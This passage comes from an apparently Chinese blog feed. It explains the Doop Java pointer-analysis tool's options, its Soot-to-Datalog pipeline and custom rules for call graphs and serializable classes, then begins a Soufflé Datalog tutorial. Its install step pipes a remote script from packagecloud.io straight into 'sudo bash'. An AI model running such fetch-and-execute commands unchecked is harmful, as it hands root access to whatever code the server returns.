uniform-2-type-sensitive+heap</span><br></pre></td></tr></table></figure><p>从上往下列举可能会用到的一些选项，<code>--android</code> 表示分析安卓程序；<code>--app-only</code> 表示解析应用程序输入，忽略 JDK；<code>--cfg</code> 表示生成控制流图；<code>--dry-run</code> 生成事实，不执行分析；<code>--extra-logic</code> 用于添加自己的 Datalog 规则；<code>--gen-opt-directives</code> 添加用于调优的关系。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--android                                              Force Android mode <span class="keyword">for</span> code inputs that are not <span class="keyword">in</span> .apk format.</span><br><span class="line">--app-only                                             Only analyze the application input(s), ignore libraries/platform.</span><br><span class="line">--cfg                                                  Perform a CFG analysis.</span><br><span class="line">--dry-run                                              Do a dry run of the analysis (generate facts and compile but don<span class="string">&#x27;t run analysis logic).</span></span><br><span class="line"><span class="string">--extra-logic &lt;FILE&gt;                                   Include files with extra rules.</span></span><br><span class="line"><span class="string">--gen-opt-directives                                   Generate additional relations for code optimization uses.</span></span><br></pre></td></tr></table></figure><p><code>-h</code> 帮助信息可以分类查看；<code>-i</code> 指定输入，甚至可以是 maven-id（例如，<code>commons-collections:commons-collections:3.1</code>）；<code>--id 用于指定输出文件夹的名称，默认随机长串</code>；<code>-L</code> 改变日志级别；<code>--max-memory</code> 设置内存消耗上限，推测不指定就是无上限（因为跑到过 800G 内存）；<code>--platform</code> 默认 Java8 不用设置；<code>-t</code> 默认超时时间 90min；<code>-v</code> 打印版本信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-h,--<span class="built_in">help</span> &lt;SECTION&gt;                                       Display <span class="built_in">help</span> and <span class="built_in">exit</span>. Valid values: all, configuration, data-flow, datalog-engine, entry-points, fact-generation, heap-snapshots, information-flow,</span><br><span class="line">                                                          native-code, open-programs, python, reflection, server-logic, statistics, xtras</span><br><span class="line">-i,--input-file &lt;INPUT&gt;                                   The (application) input files of the analysis. Accepted formats: .jar, .war, .apk, .aar, maven-id</span><br><span class="line">   --<span class="built_in">id</span> &lt;ID&gt;                                              The analysis <span class="built_in">id</span>. If omitted, it is automatically generated.</span><br><span class="line">-L,--level &lt;LOG_LEVEL&gt;                                    Set the <span class="built_in">log</span> level: debug, info or error (default: info).</span><br><span class="line">-l,--library-file &lt;LIBRARY&gt;                               The dependency/library files of the application. Accepted formats: .jar, .apk, .aar</span><br><span class="line">   --max-memory &lt;MEMORY_SIZE&gt;                             The maximum memory that the analysis can consume (does not include memory needed by fact generation). Example values: 2m, 4g.</span><br><span class="line">   --platform &lt;PLATFORM&gt;                                  The platform on <span class="built_in">which</span> to perform the analysis. For Android, the plaftorm suffix can either be <span class="string">&#x27;stubs&#x27;</span> (provided by the Android SDK), <span class="string">&#x27;fulljars&#x27;</span> (a custom</span><br><span class="line">                                                          Android build), or <span class="string">&#x27;apks&#x27;</span> (custom Dalvik equivalent). Default: java_8. Valid values: java_3, java_4, java_5, java_6, java_7, java_7_debug, java_8,</span><br><span class="line">                                                          java_8_debug, java_8_mini, java_9, java_10, java_11, java_12, java_13, java_14, java_15, java_16, android_22_fulljars, android_25_fulljars, android_2_stubs,</span><br><span class="line">                                                          android_3_stubs, android_4_stubs, android_5_stubs, android_6_stubs, android_7_stubs, android_8_stubs, android_9_stubs, android_10_stubs, android_11_stubs,</span><br><span class="line">                                                          android_12_stubs, android_13_stubs, android_14_stubs, android_15_stubs, android_16_stubs, android_17_stubs, android_18_stubs, android_19_stubs,</span><br><span class="line">                                                          android_20_stubs, android_21_stubs, android_22_stubs, android_23_stubs, android_24_stubs, android_25_stubs, android_26_stubs, android_27_stubs,</span><br><span class="line">                                                          android_28_stubs, android_29_stubs, android_25_apks, android_26_robolectric, python_2</span><br><span class="line">-t,--<span class="built_in">timeout</span> &lt;TIMEOUT&gt;                                    The analysis execution <span class="built_in">timeout</span> <span class="keyword">in</span> minutes (default: 90 minutes).</span><br><span class="line">-v,--version                                              Display version and <span class="built_in">exit</span>.</span><br></pre></td></tr></table></figure><p>数据流分析相关选项，没有用过。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--data-flow-goto-lib                                   Allow data-flow logic to go into library code using CHA.</span><br><span class="line">--data-flow-only-lib                                   Run data-flow logic only <span class="keyword">for</span> library code.</span><br></pre></td></tr></table></figure><p>针对 souffle 引擎的选项，可以用 <code>--souffle-jobs</code> 指定更多的并行空间，前提是分析能够有这么多并行，否则也不会达到指定的数量。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--souffle-jobs &lt;NUMBER&gt;                                Specify number of Souffle <span class="built_in">jobs</span> to run (default: 4).</span><br></pre></td></tr></table></figure><p>分析的入口点选择，没有用过，貌似不指定寻找 main 类就触发 open-program 分析。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--discover-main-methods                                Discover main() methods.</span><br><span class="line">--discover-tests                                       Discover and treat <span class="built_in">test</span> code (e.g. JUnit) as entry points.</span><br><span class="line">--exclude-implicitly-reachable-code                    Don<span class="string">&#x27;t make any method implicitly reachable.</span></span><br><span class="line"><span class="string">--ignore-main-method                                   If main class is not given explicitly, do not try to discover it from jar/filename info. Open-program analysis variant may be triggered in this case.</span></span><br><span class="line"><span class="string">--main &lt;MAIN&gt;                                          Specify the main class(es) separated by spaces.</span></span><br></pre></td></tr></table></figure><p>关于事实的生成，Doop 中的事实是基于 Soot 的分析生成。<code>--fact-gen-cores</code> 可以用来增加并行度，同样，分析达不到这么多并行那也不会达到指定数量；<code>--facts-only</code> 只生成事实；<code>--generate-jimple</code> 生成事实和 Jimple&#x2F;Shimple 文件；<code>--wala-fact-gen</code> 选用 WALA 生成事实。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--also-resolve &lt;CLASS&gt;                                 Force resolution of class(es) by Soot.</span><br><span class="line">--cache                                                The analysis will use the cached facts, <span class="keyword">if</span> they exist.</span><br><span class="line">--dont-cache-facts                                     Don<span class="string">&#x27;t cache generated facts.</span></span><br><span class="line"><span class="string">--extract-more-strings                                 Extract more string constants from the input code (may degrade analysis performance).</span></span><br><span class="line"><span class="string">--fact-gen-cores &lt;NUMBER&gt;                              Number of cores to use for parallel fact generation.</span></span><br><span class="line"><span class="string">--facts-only                                           Only generate facts and exit.</span></span><br><span class="line"><span class="string">--generate-jimple                                      Generate Jimple/Shimple files along with .facts files.</span></span><br><span class="line"><span class="string">--input-id &lt;ID&gt;                                        Import facts from dir with id ID and start the analysis. Application/library inputs are ignored.</span></span><br><span class="line"><span class="string">--report-phantoms                                      Report phantom methods/types during fact generation.</span></span><br><span class="line"><span class="string">--thorough-fact-gen                                    Attempt to resolve as many classes during fact generation (may take more time).</span></span><br><span class="line"><span class="string">--unique-facts                                         Eliminate redundancy from .facts files.</span></span><br><span class="line"><span class="string">--wala-fact-gen                                        Use WALA to generate the facts.</span></span><br><span class="line"><span class="string">--Xfacts-subset &lt;SUBSET&gt;                               Produce facts only for a subset of the given classes. Valid values: PLATFORM, APP, APP_N_DEPS</span></span><br><span class="line"><span class="string">--Xignore-factgen-errors                               Continue with analysis despite fact generation errors.</span></span><br><span class="line"><span class="string">--Xsymlink-input-facts                                 Use symbolic links instead of copying cached facts. Used with --cache or --input-id.</span></span><br></pre></td></tr></table></figure><p>如果没有指定入口或没有找到 main，将默认启用 <code>--open-programs xxx</code> 寻找分析的入口点；其他两个选项没用过，也没说明。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--open-programs &lt;STRATEGY&gt;                             Create analysis entry points and environment using various strategies (such as <span class="string">&#x27;concrete-types&#x27;</span> or <span class="string">&#x27;jackee&#x27;</span>).</span><br><span class="line">--open-programs-context-insensitive-entrypoints</span><br><span class="line">--open-programs-heap-context-insensitive-entrypoints</span><br></pre></td></tr></table></figure><p>支持分析反射的一些选项，弄不清每个选项都包含什么分析的情况下，一律建议使用 <code>--reflection-classic</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--distinguish-reflection-only-string-constants         Merge all string constants except those useful <span class="keyword">for</span> reflection.</span><br><span class="line">--distinguish-string-buffers-per-package               Merges string buffer objects only on a per-package basis (default behavior <span class="keyword">for</span> reflection-classic).</span><br><span class="line">--light-reflection-glue                                Handle some shallow reflection patterns without full reflection support.</span><br><span class="line">--reflection                                           Enable logic <span class="keyword">for</span> handling Java reflection.</span><br><span class="line">--reflection-classic                                   Enable (classic subset of) logic <span class="keyword">for</span> handling Java reflection.</span><br><span class="line">--reflection-dynamic-proxies                           Enable handling of the Java dynamic proxy API.</span><br><span class="line">--reflection-high-soundness-mode                       Enable extra rules <span class="keyword">for</span> more sound handling of reflection.</span><br><span class="line">--reflection-invent-unknown-objects</span><br><span class="line">--reflection-method-handles                            Reflection-based handling of the method handle APIs.</span><br><span class="line">--reflection-refined-objects</span><br><span class="line">--reflection-speculative-use-based-analysis</span><br><span class="line">--reflection-substring-analysis                        Allows reasoning on what substrings may yield reflection objects.</span><br><span class="line">--tamiflex &lt;FILE&gt;                                      Use file with tamiflex data <span class="keyword">for</span> reflection.</span><br></pre></td></tr></table></figure><p><code>--stats none</code> 可以用于关闭统计。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--stats &lt;LEVEL&gt;                                        Set statistics collection logic. Valid values: none, default, full</span><br></pre></td></tr></table></figure><p>形如 <code>--X...</code> 的选项是实验性选项，不一定支持所有分析。这些参数可能是一条 commit 增加的小功能，不建议使用，因为这些参数本身就只用于特定分析。</p><h2 id="分析逻辑"><a href="#分析逻辑" class="headerlink" title="分析逻辑"></a>分析逻辑</h2><p>Doop 执行流程大致可以分为三步：</p><ol><li>使用 soot 生成 jimple 文件<ul><li>使用 <code>--generate-jimple</code> 参数可以输出 jimple 文件，在 <code>output/&lt;ID&gt;/database/jimple</code> 文件夹下</li></ul></li><li>将 jimple 文件转换为 datalog 引擎的输入事实（.facts）</li><li>使用 souffle 引擎执行选定的分析，将关系输出为 .csv，即分析结果</li></ol><p>Doop 分析字节码（或 Android 的 Dex 代码），两者都被转换为名为 Jimple 的中间表示（Intermediate Representation, IR），实际分析的就是 jimple；因为字节码是基于堆栈的，但指针分析中需要变量&#x2F;局部变量来分析指向，所以使用 Soot 将基于堆栈的字节码转换为具有局部变量的中间表示。下一步将 Jimple 中间表示转换为 .facts 文件（数据库表），然后由 Datalog 逻辑加载这些文件作为输入。Datalog 从输入开始推导事实，填充关系；一些关系使用 <code>.output</code> 标记输出，保存为 .csv 文件；当 Datalog 执行终止时，保存的 .csv 文件就是分析输出。</p><p><img src="https://s2.loli.net/2021/12/17/NP1SnQWBdwMAzJu.jpg"></p><h2 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h2><p>一个简单的例子，保存为 Main.java 并生成 test.jar 包。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        list.add(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>-i</code> 指定分析的 jar 包；<code>-a context-insensitive</code> 使用上下文不敏感分析；<code>--stats none</code> 关闭统计信息；<code>--generate-jinple</code> 生成 Shimple&#x2F;Jimple 文件；<code>--fact-gen-cores 32 --souffle-jobs 32</code> 最大并行任务数量；<code>--id test</code> 指定输出文件夹 test。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 耗时 4m 24s</span></span><br><span class="line">./doop -i test.jar -a context-insensitive --stats none --generate-jimple --fact-gen-cores 32 --souffle-jobs 32 --<span class="built_in">id</span> <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>分析完毕后，<code>./doop/last-analysis/</code> 将链接到最新的分析结果，即 <code>./doop/out/test/database</code>，每次分析都将在 out 目录下生成一个 <ID> 目录，包含输出的数据库（database）、规则文件（<code>xxxanalysis.dl</code>、<code>gen_*.dl</code>）、元数据文件（meta）。</p><p>需要注意的是，可能是因为没有启用 <code>--discover-main-methods</code> 选项，所以警告没找到 main 类，并默认触发 <code>--open-programs xxx</code>，可以显式关闭 <code>--open-programs disabled</code>。使用的配置可以在元数据文件中查看，这里用的是 <code>jackee</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -e &quot;OPEN&quot; out/test/meta</span><br></pre></td></tr></table></figure><p>如果指定生成 Jimple&#x2F;Shimple 文件，那么 database 文件夹下会多出一个 jimple 文件夹；souffle 分析使用的是 <code>gen_*.dl</code> 文件，可以用于查看命名空间。</p><p>database 文件夹中包含 .facts 事实文件，以及输出 .csv，输出是在 dl 规则文件中指定，可以编写自定义的规则文件并使用 <code>--extra-logic myrules.dl</code> 合并分析。</p><p>事实和输出的内容格式可以在 doop&#x2F;souffle-logic&#x2F; 目录下搜索，或直接查看 <code>gen_*.dl</code> 文件，其中 <code>?</code> 开头表示变量名（一种约定，没有为什么）。</p><p>以 <code>AnyCallGraphEdge</code> 为例，声明包含调用语句、方法两个参数，定义为其他调用边的并集，最后用 <code>.output</code> 输出到 csv 文件。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">AnyCallGraphEdge</span>(?instr:<span class="symbol">Instruction</span>, ?method:<span class="symbol">Method</span>)</span><br><span class="line"><span class="symbol">AnyCallGraphEdge</span>(?i, ?m) :- <span class="symbol">CallGraphEdge</span>(<span class="symbol">_</span>, ?i, <span class="symbol">_</span>, ?m).</span><br><span class="line"><span class="symbol">AnyCallGraphEdge</span>(?i, ?m) :- <span class="symbol">InvokedynamicBootCallGraphEdge</span>(<span class="symbol">_</span>, ?i, <span class="symbol">_</span>, ?m).</span><br><span class="line"><span class="symbol">AnyCallGraphEdge</span>(?i, ?m) :- <span class="symbol">LambdaCallGraphEdge</span>(<span class="symbol">_</span>, ?i, <span class="symbol">_</span>, ?m, <span class="symbol">_</span>).</span><br><span class="line"><span class="symbol">AnyCallGraphEdge</span>(?i, ?m) :- <span class="symbol">MethodHandleCallGraphEdge</span>(<span class="symbol">_</span>, ?i, <span class="symbol">_</span>, ?m, <span class="symbol">_</span>, <span class="symbol">_</span>).</span><br><span class="line"><span class="symbol">AnyCallGraphEdge</span>(?i, ?m) :- <span class="symbol">OpaqueCallGraphEdge</span>(?i, ?m).</span><br><span class="line">.output <span class="symbol">AnyCallGraphEdge</span>(<span class="symbol">IO</span>=<span class="string">&quot;file&quot;</span>,filename=<span class="string">&quot;AnyCallGraphEdge.csv&quot;</span>,delimiter=<span class="string">&quot;\t&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/17/AZk5M4dHwImoqbf.jpg"></p><h2 id="构造调用图"><a href="#构造调用图" class="headerlink" title="构造调用图"></a>构造调用图</h2><p>那么能不能直接用调用边 <code>AnyCallGraphEdge</code> 构造调用图呢，答案是<strong>不行</strong>，因为是语句指向方法，而不是方法指向方法。因此，这里就可以试一试自定义规则了~</p><p>首先找到语句所包含的方法调用，用关系 <code>Instruction_Method</code> 就可以定位，然后将二者进行匹配连接，最后输出 <code>方法 -&gt; 方法</code> 作为调用图。这里的 <code>Method</code> 是 Doop 定义的类型，表示方法（实际上就是字符串 <code>.type Method = symbol</code>），而变量 <code>?invocation</code> 表示指令语句（实际上也是字符串 <code>.type Instruction = symbol</code>）。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">CG</span>(?caller:<span class="symbol">Method</span>, ?callee:<span class="symbol">Method</span>)</span><br><span class="line"></span><br><span class="line"><span class="symbol">CG</span>(?caller, ?callee) :-</span><br><span class="line">  mainAnalysis.<span class="symbol">AnyCallGraphEdge</span>(?invocation, ?callee),</span><br><span class="line">  <span class="symbol">Instruction_Method</span>(?invocation, ?caller).</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">CG</span></span><br></pre></td></tr></table></figure><p>将上述规则保存到 myrules.dl 文件中，重新执行分析，<code>--extra-logic myrules.dl</code> 表示添加自定义的规则。经测试，默认 <code>--open-programs jackee</code> 生成的调用图中无法找到 Main 类相关的调用，使用 <code>--open-programs concrete-types</code> 即可，但分析耗时增加。</p><ul><li>jackee 实际上是对 JavaEE 的分析，因此建议默认使用 concrete-types，相关论文：<a href="https://yanniss.github.io/enterprise-pldi20.pdf">Static Analysis of Java Enterprise Applications: Frameworks and Caches, the Elephants in the Room</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 耗时 6m 2s</span></span><br><span class="line">./doop -i test.jar -a context-insensitive --stats none --generate-jimple --fact-gen-cores 32 --souffle-jobs 32 --open-programs concrete-types --extra-logic myrules.dl --<span class="built_in">id</span> cg</span><br></pre></td></tr></table></figure><p>最后可以在调用图中查找 Main 类相关的调用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -e <span class="string">&quot;Main:&quot;</span> out/cg/database/CG.csv</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/17/JEmRyi6DUYV3o7v.jpg"></p><h2 id="查找关系"><a href="#查找关系" class="headerlink" title="查找关系"></a>查找关系</h2><p>声明了一个名为 <code>IsSerializable</code> 的关系，定义为 <code>java.io.Serializable</code> 的子类，输出结果将会是可序列化类。</p><ul><li><code>basic.SubtypeOf</code> 表示 basic 命名空间（组件）下的 SubtypeOf 关系，包含类之间的继承关系</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">IsSerializable</span>(?class:<span class="symbol">Type</span>)</span><br><span class="line"></span><br><span class="line"><span class="symbol">IsSerializable</span>(?subtype) :-</span><br><span class="line">  basic.<span class="symbol">SubtypeOf</span>(?subtype, ?type),</span><br><span class="line">  ?type = <span class="string">&quot;java.io.Serializable&quot;</span>.</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">IsSerializable</span></span><br></pre></td></tr></table></figure><p>保存到 myrules.dl 中，执行同样的分析。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 耗时 5m59s</span></span><br><span class="line">./doop -i test.jar -a context-insensitive --stats none --generate-jimple --fact-gen-cores 32 --souffle-jobs 32 --open-programs concrete-types --extra-logic myrules.dl --<span class="built_in">id</span> ser</span><br></pre></td></tr></table></figure><p>能够得到预期的结果：</p><p><img src="https://s2.loli.net/2021/12/17/8wLlpkeA1FMhdQq.jpg"></p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>拖了一个月终于写了点东西（摊手），实际上对 Doop 规则的理解全靠阅读 doop&#x2F;souffle-logic 中的 datalog 以及在 Discord 频道里进行提问，至少现在能够看懂大部分规则，也能够根据需求写一写简单的规则了。</p><p>分析比较耗时和不直观，据说是最先进的指针分析工具，但上手实在是困难。</p><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><p>基本就是根据工具本身和相关论文摸索出来的。</p><ul><li><a href="https://bitbucket.org/yanniss/doop/src/master/">Yannis Smaragdakis&#x2F;Untitled project&#x2F;doop</a></li><li><a href="https://bitbucket.org/yanniss/doop/src/master/docs/doop-101.md">Doop 101</a></li><li><a href="https://github.com/souffle-lang/souffle">souffle-lang&#x2F;souffle</a></li><li><a href="https://souffle-lang.github.io/">Soufflé | Soufflé • A Datalog Synthesis Tool for Static Analysis</a></li><li><a href="http://plast-lab.github.io/">PLaST research group</a></li><li><a href="https://discord.gg/4q7rj5s">Doop Discord Channel</a></li></ul>]]></content>
    
    
    <summary type="html">简易使用说明 + 自定义 Datalog 扩展规则</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Datalog" scheme="https://jckling.github.io/tags/Datalog/"/>
    
    <category term="Java" scheme="https://jckling.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Datalog 引擎 Soufflé 指南</title>
    <link href="https://jckling.github.io/2021/11/22/Other/Datalog%20%E5%BC%95%E6%93%8E%20Souffl%C3%A9%20%E6%8C%87%E5%8D%97/"/>
    <id>https://jckling.github.io/2021/11/22/Other/Datalog%20%E5%BC%95%E6%93%8E%20Souffl%C3%A9%20%E6%8C%87%E5%8D%97/</id>
    <published>2021-11-22T11:01:43.000Z</published>
    <updated>2021-12-11T09:27:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间看 Doop 顺手整理了篇 <a href="https://jckling.github.io/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/">LogiQL 入门</a>，现在整理一下 Soufflé 的使用记录。Soufflé 是一款开源的 Datalog 引擎，相对 LogixBlox 更新更快（至少有论文这么总结），而 Doop 默认使用和维护了一整套 Soufflé 的规则。因为是开源引擎，所以有相关工作直接对 Doop 和 Soufflé 进行修改，用于实现一些分析，然后发了顶会😇😇😇</p><p>相关资料真的是少，不然就是难读，反正花时间看呗（摊手），最终目的是看懂 Doop 中的规则。</p><h1 id="安装-Souffle"><a href="#安装-Souffle" class="headerlink" title="安装 Soufflé"></a>安装 Soufflé</h1><p>实验使用 Ubuntu 20.04 进行，souffle、doop（java8）都可以成功安装和使用。</p><p>Soufflé 有一个解释器和一个编译器来执行 Datalog 程序，通过脚本安装。<em>PS：万一无法下载，可能是服务器问题（之前也宕机过）</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载</span></span><br><span class="line">curl -s https://packagecloud.io/install/repositories/souffle-lang/souffle/script.deb.sh | sudo bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">sudo apt install souffle -y</span><br></pre></td></tr></table></figure><h1 id="使用-Souffle"><a href="#使用-Souffle" class="headerlink" title="使用 Soufflé"></a>使用 Soufflé</h1><h2 id="一个简单的例子"><a href="#一个简单的例子" class="headerlink" title="一个简单的例子"></a>一个简单的例子</h2><p>example.dl 定义“边”和“路径”</p><ul><li><code>edge</code> 是一个 <code>.input</code> 关系，将从磁盘读取</li><li><code>path</code> 是一个 <code>.output</code> 关系，将被写入磁盘</li><li>如果有一条从 x 到 y 的边，那么就有一条从 x 到 y 的路径</li><li>如果有一条从 x 到 z 的路径，并且从 z 到 y 有一条边，那么就有一条从 x 到 y 的路径</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.decl edge(x:number, y:number)  // 声明</span><br><span class="line">.input edge     // 没有指定文件，默认从 edge.facts 中读取</span><br><span class="line"></span><br><span class="line">.decl path(x:number, y:number)  // 声明</span><br><span class="line">.output path    // 输出为 path.csv</span><br><span class="line"></span><br><span class="line">// 定义，注意末尾的 . 符号</span><br><span class="line">path(x, y) :- edge(x, y).</span><br><span class="line">path(x, y) :- path(x, z), edge(z, y).</span><br></pre></td></tr></table></figure><p>如果输入的 <code>edge</code> 关系是图中的顶点对，根据上面的两个规则，输出的路径关系将提供所有顶点对 x 和 y，即图中存在 x 到 y 的路径。</p><p>输入文件 edge.facts，使用制表符分隔：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">2 3</span><br></pre></td></tr></table></figure><p>执行分析，<code>-F</code> 表示输入文件路径，<code>-D</code> 表示输出文件路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">souffle -F. -D. example.dl</span><br><span class="line"><span class="comment"># souffle -F./input -D./output example.dl</span></span><br></pre></td></tr></table></figure><p>查看输出文件 path.csv，包含所有存在路径的顶点对：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">12</span><br><span class="line">23</span><br><span class="line">13</span><br></pre></td></tr></table></figure><p>上面运行的是 <strong>解释器模式</strong>，Soufflé 还支持 <strong>编译器模式</strong>，将 Datalog 程序转换为 C++ 程序，然后编译生成可执行文件，使用 <code>-o</code> 参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成可执行文件</span></span><br><span class="line">souffle -F. -D. -oexample example.dl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行分析</span></span><br><span class="line">./example -F. -D. example.dl</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/22/BIYwt49Tdufm8gU.png"></p><p><code>-r</code> 参数用于调试，生成 HTML 格式的调试报告 <a href="https://github.com/jckling/Assets/blob/master/others/example.html">example.html</a>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffle -F. -D. -rexample.html example.dl</span><br></pre></td></tr></table></figure><p><code>-p</code> 参数用于分析，以下命令将创建一个包含分析信息的日志文件 <a href="https://github.com/jckling/Assets/blob/master/others/example.log">example.log</a>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffle -F. -D. -pexample.log example.dl</span><br></pre></td></tr></table></figure><p>souffle 还提供了一个命令行工具 <code>souffleprof</code>，可用于分析 example.log：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffleprof example.log</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/22/k5K69OytM8igDXB.jpg"></p><h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><p>Datalog 是一种（声明式）基于逻辑的查询语言，允许用户执行递归查询。Datalog 语法的规范没有统一的标准，通常采用 Prolog 风格的语法。Soufflé 的语法受到 Datalog 实现的启发，即 Z3 中的 bddbddb(BDD-Based Deductive DataBase) 和 muZ。</p><p>Soufflé 为大规模面向逻辑的编程提供了软件工程功能（例如组件），对于实际使用，Soufflé 通过算术函子（arithmetic functors）扩展了 Datalog 使其图灵等价，让程序员能够编写非终止的程序。</p><ul><li>非终止的一个例子是事实 A(0) 